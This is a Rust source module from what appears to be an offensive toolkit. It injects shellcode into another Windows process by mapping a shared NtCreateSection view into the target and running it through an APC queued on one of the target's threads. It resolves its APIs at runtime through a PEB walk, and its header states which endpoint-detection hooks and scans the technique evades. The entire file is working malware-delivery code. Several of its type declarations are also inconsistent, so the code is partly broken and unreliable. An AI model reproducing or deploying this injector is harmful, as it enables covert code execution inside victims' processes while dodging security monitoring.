//! T-REX Section Jacking delivery injector.
//!
//! Zero-`WriteProcessMemory`, zero-`CreateRemoteThread` process injection.
//! Maps shellcode into a target process via `NtCreateSection` shared memory:
//! the local RW view and the remote RX view alias the **same physical pages**,
//! so writing to the local view instantly populates the remote view — no
//! cross-process write syscall, no `VirtualAllocEx`, no `CreateRemoteThread`.
//!
//! Execution is triggered via `NtQueueApcThread` (APC hijack) against a thread
//! discovered via `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`.
//!
//! ## Detection posture
//! - **Evades**: `WriteProcessMemory` hooks (there are none), unbacked-executable
//!   scans (the section is section-backed, not private-commit), `CreateRemoteThread`
//!   hooks (APC queue, not remote-thread creation).
//! - **Does NOT evade**: APC-queue monitoring (ETW-TI `EtwTiLogQueueApcThread`),
//!   section-object enumeration (`NtQuerySystemInformation` class `SystemHandleInformation`).
//!
//! ## References
//! - zero-loader (xAL6 2026): Module Stomping + Section Jacking for zero WriteProcessMemory
//! - Existing patterns: `fluctuation.rs`, `inject.rs`

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;

// ---- Type aliases ----------------------------------------------------------

type NtStatus = i32;

const STATUS_SUCCESS: NtStatus = 0;

// ---- Constants -------------------------------------------------------------

/// Pseudo-handle for the current process (`NtCurrentProcess()`).
const NT_CURRENT_PROCESS: isize = -1;

/// Pseudo-handle for the current thread (`NtCurrentThread()`).
#[allow(dead_code)]
const NT_CURRENT_THREAD: isize = -2;

/// `SECTION_MAP_READ` — desired access for `NtMapViewOfSection`.
const SECTION_MAP_READ: u32 = 0x0004;
/// `SECTION_MAP_WRITE` — desired access for `NtMapViewOfSection`.
const SECTION_MAP_WRITE: u32 = 0x0002;
/// `SECTION_MAP_EXECUTE` — desired access for `NtMapViewOfSection`.
const SECTION_MAP_EXECUTE: u32 = 0x0008;

/// `PAGE_READWRITE` — section allocation attribute.
const PAGE_READWRITE: u32 = 0x04;
/// `PAGE_EXECUTE_READ` — remote view protection.
const PAGE_EXECUTE_READ: u32 = 0x20;

/// `SEC_COMMIT` — section allocation attribute (commit pages).
const SEC_COMMIT: u32 = 0x0800_0000;

/// `MEM_COMMIT` — view allocation type for `NtMapViewOfSection`.
#[allow(dead_code)]
const MEM_COMMIT: u32 = 0x1000;

/// `PROCESS_VM_OPERATION` — for `NtOpenProcess`.
const PROCESS_VM_OPERATION: u32 = 0x0008;
/// `PROCESS_VM_WRITE` — for `NtOpenProcess`.
const PROCESS_VM_WRITE: u32 = 0x0020;

/// `TH32CS_SNAPTHREAD` — snapshot flag for `CreateToolhelp32Snapshot`.
const TH32CS_SNAPTHREAD: u32 = 0x0000_0004;

/// Sentinel value for an invalid handle (returned by `CreateToolhelp32Snapshot`
/// on failure).
const INVALID_HANDLE_VALUE: isize = -1;

/// `THREAD_SET_CONTEXT` — access mask needed for APC queueing.
const THREAD_SET_CONTEXT: u32 = 0x0010;

/// Sentinel object attributes: a null pointer means "default security + unnamed".
const NULL_OBJ_ATTR: *mut c_void = core::ptr::null_mut();

// ---- FFI function pointer types --------------------------------------------

type NtOpenProcessFn =
    unsafe extern "system" fn(
        *mut c_void, // ProcessHandle (out)
        u32,         // DesiredAccess
        *mut c_void, // ObjectAttributes
        *mut c_void, // ClientId (in, pointer to CLIENT_ID struct)
    ) -> NtStatus;

type NtCreateSectionFn =
    unsafe extern "system" fn(
        *mut c_void, // SectionHandle (out)
        u32,          // DesiredAccess
        *mut c_void,  // ObjectAttributes
        *mut i64,     // MaximumSize (pointer to LARGE_INTEGER)
        u32,          // SectionPageProtection
        u32,          // AllocationAttributes
        c_void,       // FileHandle (null for paging-file-backed)
    ) -> NtStatus;

type NtMapViewOfSectionFn =
    unsafe extern "system" fn(
        c_void,        // SectionHandle
        c_void,        // ProcessHandle
        *mut *mut c_void, // BaseAddress (out)
        usize,         // ZeroBits
        usize,         // CommitSize
        *mut i64,      // SectionOffset (pointer to LARGE_INTEGER)
        *mut usize,    // ViewSize (in/out)
        u32,           // InheritDisposition
        u32,           // AllocationType
        u32,           // Win32Protect
    ) -> NtStatus;

type NtUnmapViewOfSectionFn =
    unsafe extern "system" fn(
        c_void,    // ProcessHandle
        *mut c_void, // BaseAddress
    ) -> NtStatus;

type NtQueueApcThreadFn =
    unsafe extern "system" fn(
        c_void, // ThreadHandle
        c_void, // ApcRoutine
        usize,  // ApcArgument1
        usize,  // ApcArgument2
        usize,  // ApcArgument3
    ) -> NtStatus;

type NtCloseFn =
    unsafe extern "system" fn(
        c_void, // Handle
    ) -> NtStatus;

type NtOpenThreadFn =
    unsafe extern "system" fn(
        *mut c_void, // ThreadHandle (out)
        u32,          // DesiredAccess
        *mut c_void,  // ObjectAttributes
        *mut c_void,  // ClientId
    ) -> NtStatus;

type CreateToolhelp32SnapshotFn =
    unsafe extern "system" fn(u32, u32) -> *mut core::ffi::c_void;

type Thread32FirstFn =
    unsafe extern "system" fn(*mut c_void, *mut ThreadEntry32W) -> i32;

type Thread32NextFn =
    unsafe extern "system" fn(*mut c_void, *mut ThreadEntry32W) -> i32;

// ---- Structs ---------------------------------------------------------------

/// CLIENT_ID — identifies a process or thread by unique ID.
/// Used as input to `NtOpenProcess` / `NtOpenThread`.
#[repr(C)]
struct ClientId {
    unique_process: *mut core::ffi::c_void,
    unique_thread: *mut core::ffi::c_void,
}

/// THREADENTRY32W — returned by `Thread32First` / `Thread32Next`.
/// The struct is `dwSize + 8 fields`; the minimal layout for x64 is:
///   dwSize (4), cntUsage (4), th32ThreadID (4), th32OwnerProcessID (4),
///   tpBasePri (4), tpDeltaPri (4), dwFlags (4), align pad (4) = 28 bytes.
/// The Win32 definition carries `szExeFile[260]` but `TH32CS_SNAPTHREAD`
/// reportedly does not populate it, so we use the minimal layout to save
/// stack space.
#[repr(C)]
struct ThreadEntry32W {
    dw_size: u32,
    _cnt_usage: u32,
    th32_thread_id: u32,
    th32_owner_process_id: u32,
    _tp_base_pri: i32,
    _tp_delta_pri: i32,
    _dw_flags: u32,
}

// ---- Public API ------------------------------------------------------------

/// Inject `shellcode` into the process `target_pid` using Section Jacking
/// (shared memory via `NtCreateSection`) + APC hijack.
///
/// # Safety
///
/// - The target process must exist and be openable with `PROCESS_VM_OPERATION |
///   PROCESS_VM_WRITE`.
/// - The target must have at least one thread in an alertable state for the
///   APC to fire (common for GUI-thread message pumps, less reliable for
///   worker threads).
/// - This function resolves Win32/NT APIs via PEB walk at runtime.
///
/// # Errors
///
/// Returns `Err("reason")` on any failure: API resolution, handle open,
/// section creation, mapping, thread discovery, or APC queue.
pub unsafe fn section_jacking_inject(target_pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
    if shellcode.is_empty() {
        return Err("shellcode is empty");
    }

    // ---- Resolve all APIs up front (fail-fast) ------------------------------
    let fns = unsafe { resolve_apis()? };

    // ---- Step 1: Open target process ----------------------------------------
    let h_target = unsafe { open_target_process(&fns, target_pid)? };

    // ---- Step 2: Create shared section --------------------------------------
    let h_section = unsafe { create_section(&fns, shellcode.len())? };

    // ---- Step 3: Map local RW view ------------------------------------------
    let local_view = unsafe { map_local_view(&fns, h_section, NT_CURRENT_PROCESS, shellcode.len())? };

    // ---- Step 4: Copy shellcode into local view -----------------------------
    unsafe {
        core::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_view as *mut u8,
            shellcode.len(),
        );
    }

    // ---- Step 5: Map remote RX view (alias of same physical pages) ----------
    let remote_view = unsafe {
        map_remote_view(&fns, h_section, h_target, shellcode.len())?
    };

    // ---- Step 6: Unmap local view (clean house) -----------------------------
    unsafe {
        let _nt_status = (fns.nt_unmap_view_of_section)(NT_CURRENT_PROCESS, local_view);
        // Non-fatal: the remote view stays alive.
    }

    // ---- Step 7: Discover a thread in the target ---------------------------
    let h_thread = unsafe { find_target_thread(&fns, target_pid)? };

    // ---- Step 8: Queue APC against discovered thread ------------------------
    let nt_status = unsafe {
        (fns.nt_queue_apc_thread)(
            h_thread,
            remote_view,          // APC routine = shellcode start
            remote_view as usize, // Arg1 = shellcode address
            0,                    // Arg2
            0,                    // Arg3
        )
    };

    // Close the thread handle regardless of outcome.
    unsafe {
        let _ = (fns.nt_close)(h_thread);
    }

    if nt_status != STATUS_SUCCESS {
        return Err("NtQueueApcThread failed");
    }

    Ok(())
}

// ---- Internal: API resolution bundle ---------------------------------------

/// Bundled function pointers — resolved once, used across all steps.
struct InjectionFns {
    nt_open_process: NtOpenProcessFn,
    nt_create_section: NtCreateSectionFn,
    nt_map_view_of_section: NtMapViewOfSectionFn,
    nt_unmap_view_of_section: NtUnmapViewOfSectionFn,
    nt_queue_apc_thread: NtQueueApcThreadFn,
    nt_close: NtCloseFn,
    nt_open_thread: NtOpenThreadFn,
    create_toolhelp32_snapshot: CreateToolhelp32SnapshotFn,
    thread32_first: Thread32FirstFn,
    thread32_next: Thread32NextFn,
}

/// Resolve all APIs via PEB walk. Returns `Err` on the first failure.
unsafe fn resolve_apis() -> Result<InjectionFns, &'static str> {
    unsafe {
        let nt_open = export_addr(b"ntdll.dll", b"NtOpenProcess")
            .ok_or("NtOpenProcess unresolved")?;
        let nt_create_sec = export_addr(b"ntdll.dll", b"NtCreateSection")
            .ok_or("NtCreateSection unresolved")?;
        let nt_map = export_addr(b"ntdll.dll", b"NtMapViewOfSection")
            .ok_or("NtMapViewOfSection unresolved")?;
        let nt_unmap = export_addr(b"ntdll.dll", b"NtUnmapViewOfSection")
            .ok_or("NtUnmapViewOfSection unresolved")?;
        let nt_apc = export_addr(b"ntdll.dll", b"NtQueueApcThread")
            .ok_or("NtQueueApcThread unresolved")?;
        let nt_close_fn = export_addr(b"ntdll.dll", b"NtClose")
            .ok_or("NtClose unresolved")?;
        let nt_open_thr = export_addr(b"ntdll.dll", b"NtOpenThread")
            .ok_or("NtOpenThread unresolved")?;

        let snap = export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot")
            .ok_or("CreateToolhelp32Snapshot unresolved")?;
        let t32_first = export_addr(b"kernel32.dll", b"Thread32First")
            .ok_or("Thread32First unresolved")?;
        let t32_next = export_addr(b"kernel32.dll", b"Thread32Next")
            .ok_or("Thread32Next unresolved")?;

        Ok(InjectionFns {
            nt_open_process: core::mem::transmute(nt_open),
            nt_create_section: core::mem::transmute(nt_create_sec),
            nt_map_view_of_section: core::mem::transmute(nt_map),
            nt_unmap_view_of_section: core::mem::transmute(nt_unmap),
            nt_queue_apc_thread: core::mem::transmute(nt_apc),
            nt_close: core::mem::transmute(nt_close_fn),
            nt_open_thread: core::mem::transmute(nt_open_thr),
            create_toolhelp32_snapshot: core::mem::transmute(snap),
            thread32_first: core::mem::transmute(t32_first),
            thread32_next: core::mem::transmute(t32_next),
        })
    }
}

// ---- Internal: step helpers ------------------------------------------------

/// Open the target process with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE`.
unsafe fn open_target_process(
    fns: &InjectionFns,
    pid: u32,
) -> Result<c_void, &'static str> {
    let mut h_process: isize = core::ptr::null_mut();
    let client_id = ClientId {
        unique_process: pid as usize as *mut c_void,
        unique_thread: core::ptr::null_mut(),
    };

    let nt_status = unsafe {
        (fns.nt_open_process)(
            &mut h_process as *mut _ as *mut c_void,
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            NULL_OBJ_ATTR,
            &client_id as *const ClientId as *mut c_void,
        )
    };

    if nt_status != STATUS_SUCCESS {
        return Err("NtOpenProcess failed (target not running / insufficient privs)");
    }
    if h_process.is_null() {
        return Err("NtOpenProcess returned null handle");
    }
    Ok(h_process)
}

/// Create a paging-file-backed section (`SEC_COMMIT`) of `size` bytes.
unsafe fn create_section(
    fns: &InjectionFns,
    size: usize,
) -> Result<c_void, &'static str> {
    let mut h_section: isize = core::ptr::null_mut();
    let mut max_size: i64 = size as i64;

    let nt_status = unsafe {
        (fns.nt_create_section)(
            &mut h_section as *mut _ as *mut c_void,
            SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
            NULL_OBJ_ATTR,
            &mut max_size, // LARGE_INTEGER
            PAGE_READWRITE,
            SEC_COMMIT,
            0isize, // FileHandle: null = paging-file backed
        )
    };

    if nt_status != STATUS_SUCCESS {
        return Err("NtCreateSection failed");
    }
    Ok(h_section)
}

/// Map a local RW view of the section into the current process.
unsafe fn map_local_view(
    fns: &InjectionFns,
    h_section: isize,
    h_process: isize,
    size: usize,
) -> Result<*mut c_void, &'static str> {
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = size;
    let mut section_offset: i64 = 0;

    let nt_status = unsafe {
        (fns.nt_map_view_of_section)(
            h_section,
            h_process,
            &mut base,
            0,                 // ZeroBits
            size,              // CommitSize
            &mut section_offset,
            &mut view_size,
            2,                 // ViewUnmap (inherit disposition)
            0,                 // AllocationType (0 = standard)
            PAGE_READWRITE,
        )
    };

    if nt_status != STATUS_SUCCESS {
        return Err("NtMapViewOfSection (local) failed");
    }
    Ok(base)
}

/// Map a remote RX view of the section into the target process.
/// This aliases the same physical pages as the local view.
unsafe fn map_remote_view(
    fns: &InjectionFns,
    h_section: isize,
    h_target: isize,
    size: usize,
) -> Result<*mut c_void, &'static str> {
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = size;
    let mut section_offset: i64 = 0;

    let nt_status = unsafe {
        (fns.nt_map_view_of_section)(
            h_section,
            h_target,
            &mut base,
            0,
            size,
            &mut section_offset,
            &mut view_size,
            2, // ViewUnmap
            0,
            PAGE_EXECUTE_READ,
        )
    };

    if nt_status != STATUS_SUCCESS {
        return Err("NtMapViewOfSection (remote) failed");
    }
    Ok(base)
}

// ---- Internal: thread discovery --------------------------------------------

/// Walk threads via `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)` and return
/// the first thread belonging to `target_pid`.
///
/// Opens a fresh handle via `NtOpenThread` so the caller owns the handle
/// lifecycle and can queue an APC against it.
unsafe fn find_target_thread(
    fns: &InjectionFns,
    target_pid: u32,
) -> Result<c_void, &'static str> {
    let snap_h = unsafe {
        (fns.create_toolhelp32_snapshot)(TH32CS_SNAPTHREAD, 0)
    };

    if snap_h.is_null() || snap_h as isize == INVALID_HANDLE_VALUE {
        return Err("CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD) failed");
    }

    // Minimal THREADENTRY32W: only the fields we need.
    let mut te: ThreadEntry32W = ThreadEntry32W {
        dw_size: core::mem::size_of::<ThreadEntry32W>() as u32,
        _cnt_usage: 0,
        th32_thread_id: 0,
        th32_owner_process_id: 0,
        _tp_base_pri: 0,
        _tp_delta_pri: 0,
        _dw_flags: 0,
    };

    // First thread.
    let first_ok = unsafe {
        (fns.thread32_first)(snap_h, &mut te)
    };
    if first_ok == 0 {
        unsafe {
            let _ = (fns.nt_close)(snap_h);
        }
        return Err("Thread32First failed");
    }

    let mut found_tid: u32 = 0;

    loop {
        // SAFETY: te is properly initialized above and re-initialized per iteration.
        if te.th32_owner_process_id != 0 && te.th32_owner_process_id == target_pid {
            found_tid = te.th32_thread_id;
            break;
        }
        // Re-init size field (Thread32Next may clobber it).
        te.dw_size = core::mem::size_of::<ThreadEntry32W>() as u32;
        let next_ok = unsafe {
            (fns.thread32_next)(snap_h, &mut te)
        };
        if next_ok == 0 {
            break;
        }
    }

    // Close snapshot handle regardless.
    unsafe {
        let _ = (fns.nt_close)(snap_h);
    }

    if found_tid == 0 {
        return Err("no thread found in target process");
    }

    // Open a real thread handle for APC queueing.
    let mut h_thread: isize = core::ptr::null_mut();
    let client_id = ClientId {
        unique_process: core::ptr::null_mut(), // not needed for thread open
        unique_thread: found_tid as usize as *mut c_void,
    };

    let nt_status = unsafe {
        (fns.nt_open_thread)(
            &mut h_thread as *mut _ as *mut c_void,
            THREAD_SET_CONTEXT,
            NULL_OBJ_ATTR,
            &client_id as *const ClientId as *mut c_void,
        )
    };

    if nt_status != STATUS_SUCCESS || h_thread.is_null() {
        return Err("NtOpenThread failed (target thread inaccessible)");
    }

    Ok(h_thread)
}
